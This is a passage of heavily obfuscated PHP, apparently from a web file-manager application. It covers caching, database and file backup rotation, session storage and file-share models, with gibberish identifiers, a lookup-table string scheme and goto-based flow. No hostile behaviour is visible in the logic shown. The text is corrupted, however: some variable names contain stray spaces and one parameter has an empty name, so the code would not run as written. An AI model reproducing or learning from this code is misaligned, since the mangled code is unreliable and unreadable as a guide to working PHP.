is_object($ˆßÕÁŸ‚ø¤)) { $ˆßÕÁŸ‚ø¤ = json_encode($ˆßÕÁŸ‚ø¤); } $ˆßÕÁŸ‚ø¤ = rawurlencode($ˆßÕÁŸ‚ø¤); return md5(KOD_SITE_ID . $_SERVER[èÍ×öˆøÉ][71] . $ˆßÕÁŸ‚ø¤); } public static function get($»Ş³à, $òÀ¥‚¯˜Ë = false) { $©€ÏÈœ±ˆ = self::key($»Ş³à); if ($òÀ¥‚¯˜Ë) { return unserialize(self::init()->get($©€ÏÈœ±ˆ)); } if (!isset(self::$memoryCache[$©€ÏÈœ±ˆ])) { $ÊÖ = self::init()->get($©€ÏÈœ±ˆ); self::$memoryCache[$©€ÏÈœ±ˆ] = unserialize($ÊÖ); } return self::$memoryCache[$©€ÏÈœ±ˆ]; } public static function set($ôºÇ×Øş, $îÕÂ, $ÊŠ¬£Ïú±†¯ = false) { $Ø×¯ = self::key($ôºÇ×Øş); if (isset(self::$memoryCache[$Ø×¯]) && self::$memoryCache[$Ø×¯] === $îÕÂ) { return !0; } if ($ÊŠ¬£Ïú±†¯ === 0) { self::$memoryCache[$Ø×¯] = $îÕÂ; return !0; } CacheLock::lock($ôºÇ×Øş); $¦¸ÖÔÒºŸı = self::init()->set($Ø×¯, serialize($îÕÂ), $ÊŠ¬£Ïú±†¯); self::$memoryCache[$Ø×¯] = $îÕÂ; CacheLock::unlock($ôºÇ×Øş); return $¦¸ÖÔÒºŸı; } public static function getCall($ô”, $æµ¯±, $¾¦Á, $È¥ôñâÔÔ‰ = array()) { $…‚­¾ÜŠí´Ÿü =& $_SERVER[èÍ×öˆøÉ]; $¨é†±â€İú˜˜ = self::get($ô”); if ($¨é†±â€İú˜˜ || $¨é†±â€İú˜˜ === $…‚­¾ÜŠí´Ÿü[33]) { return $¨é†±â€İú˜˜; } $¨é†±â€İú˜˜ = call_user_func_array($¾¦Á, $È¥ôñâÔÔ‰); $¨é†±â€İú˜˜ = $¨é†±â€İú˜˜ ? $¨é†±â€İú˜˜ : $…‚­¾ÜŠí´Ÿü[33]; self::set($ô”, $¨é†±â€İú˜˜, $æµ¯±); return $¨é†±â€İú˜˜; } public static function remove($µ«Ş§Æ³ÌÒûÎ) { $ú–¦ = self::key($µ«Ş§Æ³ÌÒûÎ); unset(self::$memoryCache[$ú–¦]); self::clearTimeout(); CacheLock::lock($µ«Ş§Æ³ÌÒûÎ); $Ïø•“ = self::init()->remove($ú–¦); CacheLock::unlock($µ«Ş§Æ³ÌÒûÎ); return $Ïø•“; } public static function removeMemory($çû¼¨â¦ë£ı) { $†›ÚÑ‰Ğ = self::key($çû¼¨â¦ë£ı); unset(self::$memoryCache[$†›ÚÑ‰Ğ]); } public static function clearMemory($±ï‰üï = false) { if ($±ï‰üï) { $±ï‰üï = self::key($±ï‰üï); unset(self::$memoryCache[$±ï‰üï]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[èÍ×öˆøÉ][834])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[èÍ×öˆøÉ][835])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¯É˜ òõ, $ä) { $µÚùëÅÆ¸ËÎ­ =& $_SERVER[èÍ×öˆøÉ]; $this->cachePath = $¯É˜ òõ[$µÚùëÅÆ¸ËÎ­[76]]; $this->prefix = $µÚùëÅÆ¸ËÎ­[836]; $this->cacheTime = $ä; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¼ş) { $×İæİ =& $_SERVER[èÍ×öˆøÉ]; $¼ş = str_replace(array($×İæİ[837], $×İæİ[97], $×İæİ[70]), $×İæİ[838], $¼ş); return $this->cachePath . $×İæİ[839] . $¼ş . $×İæİ[840]; } public function set($´…À, $©, $·ŒÄğ’¹Å = false) { $„Îíî¥İ¥ = $this->getFile($´…À); if (file_put_contents($„Îíî¥İ¥, $this->prefix . $©, LOCK_EX)) { @touch($„Îíî¥İ¥, intval(time() + $·ŒÄğ’¹Å)); clearstatcache(); return !0; } @unlink($„Îíî¥İ¥); return !1; } public function get($øí­û—º) { $Ï€ÕõÓ = $this->getFile($øí­û—º); if (file_exists($Ï€ÕõÓ) && filemtime($Ï€ÕõÓ) < time()) { @unlink($Ï€ÕõÓ); return !1; } $¾É• = @file_get_contents($Ï€ÕõÓ); return substr($¾É•, strlen($this->prefix)); } public function remove($´ÁÄôÀ›‹ñ) { $ÎŒ = $this->getFile($´ÁÄôÀ›‹ñ); return @unlink($ÎŒ); } public function deleteAll() { $©óÚõÑë =& $_SERVER[èÍ×öˆøÉ]; $îìÑëæê¾Ç‚ = scandir($this->cachePath); foreach ($îìÑëæê¾Ç‚ as $Î¸Ü«òßßÑ¼ë) { $â³üâ”Æ‘ã¹ = $this->cachePath . $Î¸Ü«òßßÑ¼ë; if (strpos($â³üâ”Æ‘ã¹, $©óÚõÑë[840]) && strpos($â³üâ”Æ‘ã¹, $©óÚõÑë[841])) { @unlink($â³üâ”Æ‘ã¹); } } } public function clearTimeout() { $ú½¦Íã‹ =& $_SERVER[èÍ×öˆøÉ]; $ê•´ = scandir($this->cachePath); foreach ($ê•´ as $°°ø) { $şëğçÔÙ§ï = $this->cachePath . $°°ø; if (strpos($şëğçÔÙ§ï, $ú½¦Íã‹[840]) && strpos($şëğçÔÙ§ï, $ú½¦Íã‹[841]) && filemtime($şëğçÔÙ§ï) < time()) { @unlink($şëğçÔÙ§ï); } } } } goto eÎö‚¹ìÕ‹; eÁ…ß¯ò²â: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $È” =& $_SERVER[èÍ×öˆøÉ]; $this->isManual(); self::$name = date($È”[743]); if (!($ãÑ í—ã‡Ğ­Î = Model($È”[744])->lastItem())) { $ãÑ í—ã‡Ğ­Î = $this->initData(); } else { self::$name = $ãÑ í—ã‡Ğ­Î[$È”[28]]; if ($ãÑ í—ã‡Ğ­Î[$È”[745]] == $È”[87]) { self::$name = date($È”[746]); $ÒŸ = 0; if (isset($ãÑ í—ã‡Ğ­Î[$È”[291]][$È”[193]][$È”[461]])) { $ÒŸ = (int) $ãÑ í—ã‡Ğ­Î[$È”[291]][$È”[193]][$È”[461]]; } if (self::$manual == 0 && $ãÑ í—ã‡Ğ­Î[$È”[28]] == self::$name) { Model($È”[744])->remove($ãÑ í—ã‡Ğ­Î[$È”[395]]); } $ãÑ í—ã‡Ğ­Î = $this->initData($ÒŸ, $ãÑ í—ã‡Ğ­Î[$È”[747]]); } else { $this->checkStore($ãÑ í—ã‡Ğ­Î[$È”[747]]); } } self::$option = $ãÑ í—ã‡Ğ­Î; } private function isManual() { $«¤Ÿ¸ÇÚ = _get($GLOBALS, $_SERVER[èÍ×öˆøÉ][748], 0); $«¤Ÿ¸ÇÚ = intval($«¤Ÿ¸ÇÚ); self::$manual = $«¤Ÿ¸ÇÚ && $«¤Ÿ¸ÇÚ == 1 ? 1 : 0; } private function initData($èä¦ = 0, $Ì… = '') { $å¼ =& $_SERVER[èÍ×öˆøÉ]; $ÅèÒ¸ñ»¡çƒ = Model($å¼[744])->config(); if ($Ì… && $ÅèÒ¸ñ»¡çƒ[$å¼[747]] != $Ì…) { $èä¦ = 0; } $this->checkStore($ÅèÒ¸ñ»¡çƒ[$å¼[747]]); if (self::$manual == 1) { self::$name .= $å¼[71] . date($å¼[749]); } $Şã˜ğÎ = array($å¼[747] => $ÅèÒ¸ñ»¡çƒ[$å¼[747]], $å¼[28] => self::$name, $å¼[745] => 0, $å¼[750] => $ÅèÒ¸ñ»¡çƒ[$å¼[750]], $å¼[751] => self::$manual, $å¼[291] => array($å¼[752] => array($å¼[745] => 0), $å¼[753] => array($å¼[745] => 0, $å¼[754] => 0, $å¼[755] => 0, $å¼[29] => $å¼[33], $å¼[756] => 0, $å¼[490] => 0), $å¼[757] => array($å¼[745] => 0, $å¼[754] => 0, $å¼[755] => 0, $å¼[756] => 0, $å¼[490] => 0), $å¼[193] => array($å¼[745] => 0, $å¼[758] => 0, $å¼[759] => 0, $å¼[760] => 0, $å¼[761] => 0, $å¼[461] => $èä¦, $å¼[756] => 0, $å¼[490] => 0)), $å¼[756] => time(), $å¼[490] => 0); $Õ®ü = Model($å¼[744])->insert($Şã˜ğÎ); $Şã˜ğÎ[$å¼[395]] = $Õ®ü; return $Şã˜ğÎ; } private function checkStore($) { $ÛíÕå”§„ÓÎ =& $_SERVER[èÍ×öˆøÉ]; $æ†Ó×şöô = Model($ÛíÕå”§„ÓÎ[762])->listData($); Model($ÛíÕå”§„ÓÎ[762])->checkConfig($æ†Ó×şöô); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[èÍ×öˆøÉ][744])->findByName(self::$name); } return self::$option; } public static function set($³­â¦á©Øûû) { $¥Ï =& $_SERVER[èÍ×öˆøÉ]; $ç˜ = self::get(); foreach ($³­â¦á©Øûû as $í÷äÄ => $€½) { $•‹òÜ’ = explode($¥Ï[95], $í÷äÄ); $ÁÇ•Ø²ñø = count($•‹òÜ’); switch ($ÁÇ•Ø²ñø) { case 1: $ç˜[$•‹òÜ’[0]] = $€½; break; case 2: $ç˜[$•‹òÜ’[0]][$•‹òÜ’[1]] = $€½; break; case 3: $ç˜[$•‹òÜ’[0]][$•‹òÜ’[1]][$•‹òÜ’[2]] = $€½; break; } } Model($¥Ï[744])->update($ç˜[$¥Ï[395]], $ç˜); self::$option = $ç˜; return self::$option; } public function keep() { $è½ïÉ· =& $_SERVER[èÍ×öˆøÉ]; $éŸ = self::get(); if ($éŸ[$è½ïÉ·[291]][$è½ïÉ·[752]][$è½ïÉ·[745]] == $è½ïÉ·[87]) { return; } $this->backupKeep($éŸ); self::set(array($è½ïÉ·[763] => 1)); } private function backupKeep($¥ü„ÆĞ˜) { $ğÔ……Ñ³œ =& $_SERVER[èÍ×öˆøÉ]; if (self::$manual == 1) { return; } $æ¡ = Model($ğÔ……Ñ³œ[744])->listData(); if (empty($æ¡)) { return; } $µõÕ™ = 0; $Êü–ûò™Ñ  = array(); foreach ($æ¡ as $ÈÔö) { if ($µõÕ™ >= 7) { break; } $Êü–ûò™Ñ [] = $ÈÔö[$ğÔ……Ñ³œ[28]]; $µõÕ™++; } for ($µõÕ™ = 0; $µõÕ™ < 12; $µõÕ™++) { $Êü–ûò™Ñ [] = date($ğÔ……Ñ³œ[764], strtotime("\55{$µõÕ™}\x20\x6d\x6f\x6e\x74\150\163")); } $Êü–ûò™Ñ  = array_unique($Êü–ûò™Ñ ); $ ·ûäŸÍÌ = Model($ğÔ……Ñ³œ[765])->get($ğÔ……Ñ³œ[766]); foreach ($æ¡ as $ÈÔö) { if (isset($ÈÔö[$ğÔ……Ñ³œ[751]]) && $ÈÔö[$ğÔ……Ñ³œ[751]] == $ğÔ……Ñ³œ[87]) { continue; } if (!empty($ÈÔö[$ğÔ……Ñ³œ[28]]) && in_array($ÈÔö[$ğÔ……Ñ³œ[28]], $Êü–ûò™Ñ )) { continue; } Model($ğÔ……Ñ³œ[744])->remove($ÈÔö[$ğÔ……Ñ³œ[395]]); $åÙ×§ = $this->backupPath($¥ü„ÆĞ˜, $ ·ûäŸÍÌ); IO::remove($åÙ×§, !1); } } private function backupPath($Ë€ŸÛ¡, $™ˆ”äŞ = false) { $ôû =& $_SERVER[èÍ×öˆøÉ]; if (!$™ˆ”äŞ) { $™ˆ”äŞ = Model($ôû[765])->get($ôû[766]); } $Üç»”şçç = $Ë€ŸÛ¡[$ôû[28]]; $Ê = substr(md5($ôû[767] . $™ˆ”äŞ . $Üç»”şçç), 0, 8); return "\173\151\157\x3a{$Ë€ŸÛ¡[$ôû[747]]}\x7d\57\144\141\x74\141\x62\x61\163\x65\57\142\x61\x63\153\x75\x70\57" . $Üç»”şçç . $ôû[71] . $Ê; } public function db() { $˜ìäãÇ– =& $_SERVER[èÍ×öˆøÉ]; $Ò¸Öà—êÒ = self::get(); if ($Ò¸Öà—êÒ[$˜ìäãÇ–[291]][$˜ìäãÇ–[753]][$˜ìäãÇ–[745]] == $˜ìäãÇ–[87]) { return !0; } $‘ìÆãö = new BackupDb(); if (!$‘ìÆãö->index()) { return !1; } self::set(array($˜ìäãÇ–[768] => 1)); return !0; } public function dbFile() { $ã•±‘Ü­«®ñù =& $_SERVER[èÍ×öˆøÉ]; $©ûçäû§ùÓ = self::get(); if ($©ûçäû§ùÓ[$ã•±‘Ü­«®ñù[291]][$ã•±‘Ü­«®ñù[757]][$ã•±‘Ü­«®ñù[745]] == $ã•±‘Ü­«®ñù[87]) { return !0; } $­ = new BackupDbFile(); if (!$­->index()) { return !1; } self::set(array($ã•±‘Ü­«®ñù[769] => 1)); return !0; } public function file() { $ò•ÀáÛÜ–ğĞ =& $_SERVER[èÍ×öˆøÉ]; $‡ÒÆÁ˜õùÛ = self::get(); if ($‡ÒÆÁ˜õùÛ[$ò•ÀáÛÜ–ğĞ[291]][$ò•ÀáÛÜ–ğĞ[193]][$ò•ÀáÛÜ–ğĞ[745]] == $ò•ÀáÛÜ–ğĞ[87]) { return !0; } if (!isset($‡ÒÆÁ˜õùÛ[$ò•ÀáÛÜ–ğĞ[750]]) || $‡ÒÆÁ˜õùÛ[$ò•ÀáÛÜ–ğĞ[750]] == $ò•ÀáÛÜ–ğĞ[191]) { $³× = new BackupFile(); if (!$³×->index()) { return !1; } } self::set(array($ò•ÀáÛÜ–ğĞ[770] => 1, $ò•ÀáÛÜ–ğĞ[745] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $İ™Êò =& $_SERVER[èÍ×öˆøÉ]; $Ä·¨ı÷©çÇ‚ = Backup::get(); self::$io = $Ä·¨ı÷©çÇ‚[$İ™Êò[747]]; self::$name = $Ä·¨ı÷©çÇ‚[$İ™Êò[28]]; $ŸÍÊ– = $GLOBALS[$İ™Êò[6]][$İ™Êò[17]]; $¶Ò÷Åû’ = $this->_dbType($ŸÍÊ–); $è§¤»ğâ£äº = new DbManage($ŸÍÊ–, $¶Ò÷Åû’); $‰æå¢¾†Î = array($İ™Êò[771] => $¶Ò÷Åû’, $İ™Êò[772] => time()); Backup::set($‰æå¢¾†Î); $Ÿ˜ = $this->tmpFilesPath() . $İ™Êò[773] . self::$name . $İ™Êò[8]; del_dir($Ÿ˜); mk_dir($Ÿ˜); $¤ß¡Ü½ØËèùğ = $¬¡ù©ŒÄÇ = 0; try { $´½ÎŠÀ = $è§¤»ğâ£äº->db()->getTables(); } catch (Exception $¿‡çªã°é°´ì) { return !1; } $´½ÎŠÀ = array_diff($´½ÎŠÀ, array($İ™Êò[774], $İ™Êò[775])); foreach ($´½ÎŠÀ as $¤êµœ˜) { $¤ß¡Ü½ØËèùğ += $è§¤»ğâ£äº->model($¤êµœ˜)->count(); } $±® = new Task($İ™Êò[776], $İ™Êò[777], $¤ß¡Ü½ØËèùğ, LNG($İ™Êò[778]) . $İ™Êò[779] . LNG($İ™Êò[780])); foreach ($´½ÎŠÀ as $¤êµœ˜) { $¦§ÆøŒí = $Ÿ˜ . $¤êµœ˜ . $İ™Êò[781]; $îæ¶ºÔàÕÈØ = null; if ($¤êµœ˜ == $İ™Êò[782] && (!isset($Ä·¨ı÷©çÇ‚[$İ™Êò[750]]) || $Ä·¨ı÷©çÇ‚[$İ™Êò[750]] == $İ™Êò[191])) { $îæ¶ºÔàÕÈØ = self::$io; } $¬¡ù©ŒÄÇ += $è§¤»ğâ£äº->sqlFromDb($¤êµœ˜, $¦§ÆøŒí, $±®, $îæ¶ºÔàÕÈØ); } if (isset($±®->task[$İ™Êò[783]])) { $ºãßš = $±®->task[$İ™Êò[783]] ? $±®->task[$İ™Êò[783]] : timeFloat(); $²û˜×í³ = $ºãßš - $±®->task[$İ™Êò[784]]; if ($²û˜×í³ >= 0.2) { $¤ß¡Ü½ØËèùğ += 1; } } $±®->end(); $‰æå¢¾†Î = array($İ™Êò[771] => $¶Ò÷Åû’, $İ™Êò[768] => 1, $İ™Êò[785] => $¤ß¡Ü½ØËèùğ, $İ™Êò[786] => $¬¡ù©ŒÄÇ, $İ™Êò[787] => time()); Backup::set($‰æå¢¾†Î); if ($¤ß¡Ü½ØËèùğ - $¬¡ù©ŒÄÇ > 1) { $Š÷îµõÉ = $İ™Êò[788]; if (stristr(I18n::getType(), $İ™Êò[789])) { $Š÷îµõÉ = $İ™Êò[790]; } write_log(array($Š÷îµõÉ, $‰æå¢¾†Î), $İ™Êò[777]); return !1; } return !0; } private function _dbType($Æ›§¥ñÜŞ) { $ü£•êİ‡ =& $_SERVER[èÍ×öˆøÉ]; $Æ›§¥ñÜŞ = array_change_key_case($Æ›§¥ñÜŞ); $´©ÒùÛÏ‘‘Œ´ = $Æ›§¥ñÜŞ[$ü£•êİ‡[791]]; if ($´©ÒùÛÏ‘‘Œ´ == $ü£•êİ‡[792]) { $…®‹ = explode($ü£•êİ‡[4], $Æ›§¥ñÜŞ[$ü£•êİ‡[793]]); $´©ÒùÛÏ‘‘Œ´ = $…®‹[0]; } $ˆ = array($ü£•êİ‡[794] => $ü£•êİ‡[9], $ü£•êİ‡[795] => $ü£•êİ‡[796]); if (isset($ˆ[$´©ÒùÛÏ‘‘Œ´])) { $´©ÒùÛÏ‘‘Œ´ = $ˆ[$´©ÒùÛÏ‘‘Œ´]; } return $´©ÒùÛÏ‘‘Œ´; } private function tmpFilesPath() { $’ğ°İıæüÅ =& $_SERVER[èÍ×öˆøÉ]; $Œ™îæå¡àíË = TEMP_FILES; if ($GLOBALS[$’ğ°İıæüÅ[6]][$’ğ°İıæüÅ[88]][$’ğ°İıæüÅ[797]]) { $Œ™îæå¡àíË = $GLOBALS[$’ğ°İıæüÅ[6]][$’ğ°İıæüÅ[88]][$’ğ°İıæüÅ[797]]; if (!mk_dir($Œ™îæå¡àíË) || !is_writable($Œ™îæå¡àíË) || !IO::mkfile($Œ™îæå¡àíË . $’ğ°İıæüÅ[798])) { $Œ™îæå¡àíË = TEMP_FILES; } } return $Œ™îæå¡àíË; } } class BackupDbFile { public function __construct() { } public function index() { $É–ÓçùÌ¤ =& $_SERVER[èÍ×öˆøÉ]; $şÌú = Backup::get(); $—Ô‹•ĞÛå = $şÌú[$É–ÓçùÌ¤[28]]; $£Ş¾Œ = $this->tmpFilesPath() . "\x62\141\x63\x6b\165\160\137{$—Ô‹•ĞÛå}\57"; $”ÏèÄä = $this->backupPath($şÌú); if (!($”ÏèÄä = IO::mkdir($”ÏèÄä))) { return !1; } $•¾èÅÊ˜ì = IO::listPath($£Ş¾Œ); $Ó·úÑ½İ  = isset($•¾èÅÊ˜ì[$É–ÓçùÌ¤[74]]) ? $•¾èÅÊ˜ì[$É–ÓçùÌ¤[74]] : array(); $ı¥õ“Ä²¶Ïõ = array_sum(array_column($Ó·úÑ½İ , $É–ÓçùÌ¤[78])); if (!$ı¥õ“Ä²¶Ïõ) { return !1; } $¬•ä‚¥šØ­„Ş = array($É–ÓçùÌ¤[799] => $ı¥õ“Ä²¶Ïõ, $É–ÓçùÌ¤[800] => time()); Backup::set($¬•ä‚¥šØ­„Ş); $û’—òé = new TaskFileTransfer($É–ÓçùÌ¤[801], $É–ÓçùÌ¤[777], count($Ó·úÑ½İ ), LNG($É–ÓçùÌ¤[778]) . $É–ÓçùÌ¤[454] . LNG($É–ÓçùÌ¤[780]) . $É–ÓçùÌ¤[802]); $û’—òé->task[$É–ÓçùÌ¤[758]] = $ı¥õ“Ä²¶Ïõ; foreach ($•¾èÅÊ˜ì[$É–ÓçùÌ¤[74]] as $í¬Íäª¼Ó) { $¶à¸Ù = IO::move($í¬Íäª¼Ó[$É–ÓçùÌ¤[76]], $”ÏèÄä); if (!$¶à¸Ù) { $û’—òé->end(); $Ú†™Í”© = IO::getLastError($É–ÓçùÌ¤[803] . $í¬Íäª¼Ó[$É–ÓçùÌ¤[76]] . $É–ÓçùÌ¤[804] . $”ÏèÄä . $É–ÓçùÌ¤[530]); write_log($Ú†™Í”©, $É–ÓçùÌ¤[777]); return !1; } } $‘ëñ¢¢ = CONTROLLER_DIR . $É–ÓçùÌ¤[805]; $á×Ò = CONTROLLER_DIR . $É–ÓçùÌ¤[806]; IO::copy($‘ëñ¢¢, $”ÏèÄä); IO::copy($á×Ò, $”ÏèÄä); $û’—òé->end(); $¬•ä‚¥šØ­„Ş = array($É–ÓçùÌ¤[807] => $ı¥õ“Ä²¶Ïõ, $É–ÓçùÌ¤[808] => time()); Backup::set($¬•ä‚¥šØ­„Ş); return !0; } private function backupPath($Ú÷) { $åÙ =& $_SERVER[èÍ×öˆøÉ]; $¿“» = $Ú÷[$åÙ[28]]; $§üƒ¢ = Model($åÙ[765])->get($åÙ[766]); $Ù“Åõ¡åˆ–¼ = substr(md5($åÙ[767] . $§üƒ¢ . $¿“»), 0, 8); return "\x7b\151\157\72{$Ú÷[$åÙ[747]]}\x7d\57\144\x61\x74\141\142\x61\163\x65\x2f\142\141\x63\x6b\165\160\57" . $¿“» . $åÙ[71] . $Ù“Åõ¡åˆ–¼; } private function tmpFilesPath() { $³‘ê†ˆÍ =& $_SERVER[èÍ×öˆøÉ]; $™Üğœ¡Ì®Ü™ = TEMP_FILES; if ($GLOBALS[$³‘ê†ˆÍ[6]][$³‘ê†ˆÍ[88]][$³‘ê†ˆÍ[797]]) { $™Üğœ¡Ì®Ü™ = $GLOBALS[$³‘ê†ˆÍ[6]][$³‘ê†ˆÍ[88]][$³‘ê†ˆÍ[797]]; if (!mk_dir($™Üğœ¡Ì®Ü™) || !is_writable($™Üğœ¡Ì®Ü™) || !IO::mkfile($™Üğœ¡Ì®Ü™ . $³‘ê†ˆÍ[798])) { $™Üğœ¡Ì®Ü™ = TEMP_FILES; } } return $™Üğœ¡Ì®Ü™; } } goto bõÛ‘ïõñ; Bµ…¬ÙÅ‰š: class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\x6d\137\163\x65\x73\x73\x69\x6f\x6e"; public function get($Ñµºœ©«¨) { $¤°Ûã =& $_SERVER[èÍ×öˆøÉ]; $şÉ©µ = $this->where(array($¤°Ûã[1881] => $Ñµºœ©«¨))->find(); if (!is_array($şÉ©µ)) { return !1; } return $şÉ©µ[$¤°Ûã[750]]; } public function set($µ¤ê¬Ÿ­, $Çı†Œ‰ÑØ³¯é, $÷İéğõ = 3600) { $Ë©Âå×™ =& $_SERVER[èÍ×öˆøÉ]; $¸³Â… = array($Ë©Âå×™[1881] => $µ¤ê¬Ÿ­, $Ë©Âå×™[1787] => $Çı†Œ‰ÑØ³¯é, $Ë©Âå×™[1882] => $÷İéğõ + time()); if (Session::get($Ë©Âå×™[1883])) { $¸³Â…[$Ë©Âå×™[1582]] = Session::get($Ë©Âå×™[1883]); } else { $¸³Â…[$Ë©Âå×™[1582]] = 0; } if ($this->get($µ¤ê¬Ÿ­)) { return $this->where(array($Ë©Âå×™[1881] => $µ¤ê¬Ÿ­))->save($¸³Â…); } else { return $this->add($¸³Â…, array(), !0); } } public function remove($ûıç) { return $this->where(array($_SERVER[èÍ×öˆøÉ][1881] => $ûıç))->delete(); } public function clearTimeout() { return $this->where($_SERVER[èÍ×öˆøÉ][1884] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\x79\124\151\x6d\x65", "\164\x69\x6d\x65", "\151\156\x73\145\162\x74\54\x75\x70\x64\141\164\145", "\146\165\156\x63\x74\x69\x6f\156"), array("\x63\x72\145\141\x74\145\124\x69\x6d\x65", "\164\x69\155\x65", "\x69\x6e\x73\145\x72\x74", "\x66\165\x6e\143\x74\x69\157\x6e"), array("\157\160\x74\151\157\156\x73", '', "\151\x6e\x73\145\x72\x74\x2c\165\160\x64\x61\x74\145\x2c\163\145\x6c\x65\143\x74", "\x6a\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Ù®ö³¾ô¿) { $À™¥ÈÄ =& $_SERVER[èÍ×öˆøÉ]; $‡ú´Çˆâ´ = isset($Ù®ö³¾ô¿[0]) ? $Ù®ö³¾ô¿[0] : !1; return array($À™¥ÈÄ[1885] => array(USER_ID, $À™¥ÈÄ[1886]), $À™¥ÈÄ[1828] => array($‡ú´Çˆâ´, $À™¥ÈÄ[1887])); } protected function listSimple() { $€şˆĞÙõËï± = array($_SERVER[èÍ×öˆøÉ][1582] => USER_ID); $äŒ•ğ£» = $this->field($this->fieldList)->where($€şˆĞÙõËï±)->select(); return $äŒ•ğ£» ? $äŒ•ğ£» : array(); } protected function getInfo($ˆ²ÚÇŒ, $·ñ¢Ü = false) { $½ªÓİäˆÈÓ¬Á =& $_SERVER[èÍ×öˆøÉ]; if ($·ñ¢Ü) { return $this->_getShareInfo(array($½ªÓİäˆÈÓ¬Á[482] => $ˆ²ÚÇŒ)); } $õô¥ãÏ­ôĞ = $this->cacheFunctionGet($½ªÓİäˆÈÓ¬Á[1830], $ˆ²ÚÇŒ); return $õô¥ãÏ­ôĞ; } public function getInfoByHash($Ëê) { return $this->_getShareInfo(array($_SERVER[èÍ×öˆøÉ][484] => $Ëê)); } public function getInfoByPath($Áù) { $šÕğÉ‚ =& $_SERVER[èÍ×öˆøÉ]; $ä™ÆÉ = array($šÕğÉ‚[1582] => USER_ID, $šÕğÉ‚[397] => $Áù); return $this->_getShareInfo($ä™ÆÉ); } public function getInfoBySourcePath($»è¼Ó¾¬Ï) { $ø•ßâË¿§ï =& $_SERVER[èÍ×öˆøÉ]; $¥í†Èµ = array($ø•ßâË¿§ï[1582] => USER_ID, $ø•ßâË¿§ï[1109] => $»è¼Ó¾¬Ï); return $this->_getShareInfo($¥í†Èµ); } private function _getShareInfo($‡íß‡) { $Ö‹°—§µ” =& $_SERVER[èÍ×öˆøÉ]; $á = $this->where($‡íß‡)->find(); if (!$á) { return !1; } $‡íß‡ = array($Ö‹°—§µ”[482] => $á[$Ö‹°—§µ”[482]]); $çË§‡ğÈÑ = $Ö‹°—§µ”[1888]; $»ø = Model($Ö‹°—§µ”[590])->order($Ö‹°—§µ”[395])->field($çË§‡ğÈÑ)->where($‡íß‡)->select(); if ($á[$Ö‹°—§µ”[397]] == $Ö‹°—§µ”[191]) { $á[$Ö‹°—§µ”[85]] = IO::info($á[$Ö‹°—§µ”[1109]]); } else { $á[$Ö‹°—§µ”[85]] = Model($Ö‹°—§µ”[1256])->pathInfo($á[$Ö‹°—§µ”[397]]); } $á[$Ö‹°—§µ”[1889]] = $»ø; return $á; } protected function getInfoAuth($ËÅØª€) { $´ş¨ÉêÅŞ± =& $_SERVER[èÍ×öˆøÉ]; $ß¤€â«şª = $this->getInfo($ËÅØª€); if ($ß¤€â«şª[$´ş¨ÉêÅŞ±[1582]] == USER_ID) { $ß¤€â«şª[$´ş¨ÉêÅŞ±[408]] = $ß¤€â«şª[$´ş¨ÉêÅŞ±[85]][$´ş¨ÉêÅŞ±[408]]; } else { $ß¤€â«şª[$´ş¨ÉêÅŞ±[408]] = Model($´ş¨ÉêÅŞ±[496])->authMake($ß¤€â«şª[$´ş¨ÉêÅŞ±[1889]]); } return $ß¤€â«şª; } protected function listData($Òùø×•ô¡İÃê = null, $°ø×â¤ = 300) { $˜Ôì—‘¸— =& $_SERVER[èÍ×öˆøÉ]; $¦¬ = array(array($˜Ôì—‘¸—[487] => array($˜Ôì—‘¸—[1009], 0), $˜Ôì—‘¸—[489] => array($˜Ôì—‘¸—[1009], 0), $˜Ôì—‘¸—[1890] => $˜Ôì—‘¸—[1844])); if ($Òùø×•ô¡İÃê == $˜Ôì—‘¸—[1891]) { $¦¬ = array($˜Ôì—‘¸—[487] => 1); } else { if ($Òùø×•ô¡İÃê == $˜Ôì—‘¸—[1094]) { $¦¬ = array($˜Ôì—‘¸—[489] => 1); } } $¦¬[$˜Ôì—‘¸—[1582]] = USER_ID; $ƒ¦İ = $this->where($¦¬)->selectPage($°ø×â¤); return $ƒ¦İ; } protected function listToMe($±ˆ = 300) { $Ö™Ûø®§…ó =& $_SERVER[èÍ×öˆøÉ]; $Ùâ = Model($Ö™Ûø®§…ó[1892])->userGroupParents(USER_ID); $¿†ıÒà = array($Ö™Ûø®§…ó[574] => SourceModel::TYPE_USER, $Ö™Ûø®§…ó[498] => USER_ID); if ($Ùâ) { $¿†ıÒà = array(array($Ö™Ûø®§…ó[574] => SourceModel::TYPE_USER, $Ö™Ûø®§…ó[498] => USER_ID), array($Ö™Ûø®§…ó[574] => SourceModel::TYPE_GROUP, $Ö™Ûø®§…ó[498] => array($Ö™Ûø®§…ó[7], $Ùâ)), $Ö™Ûø®§…ó[1890] => $Ö™Ûø®§…ó[1844]); } $œÇú×Æ£¨ = Model($Ö™Ûø®§…ó[590])->where($¿†ıÒà)->selectPage($±ˆ); $Æù•Ğ¨¨Àüü— = array_to_keyvalue_group($œÇú×Æ£¨[$Ö™Ûø®§…ó[367]], $Ö™Ûø®§…ó[482]); if (!$Æù•Ğ¨¨Àüü—) { return $œÇú×Æ£¨; } $œñèğñ¥ = $Ö™Ûø®§…ó[1893]; $¿†ıÒà = array($Ö™Ûø®§…ó[482] => array($Ö™Ûø®§…ó[413], array_keys($Æù•Ğ¨¨Àüü—)), $Ö™Ûø®§…ó[1582] => array($Ö™Ûø®§…ó[1011], $Ö™Ûø®§…ó[191])); $´¸ê¿¹Óó = $this->field($œñèğñ¥)->where($¿†ıÒà)->select(); foreach ($´¸ê¿¹Óó as $õ› => &$³”ì) { $³”ì[$Ö™Ûø®§…ó[1889]] = $Æù•Ğ¨¨Àüü—[$³”ì[$Ö™Ûø®§…ó[482]]]; } unset($³”ì); 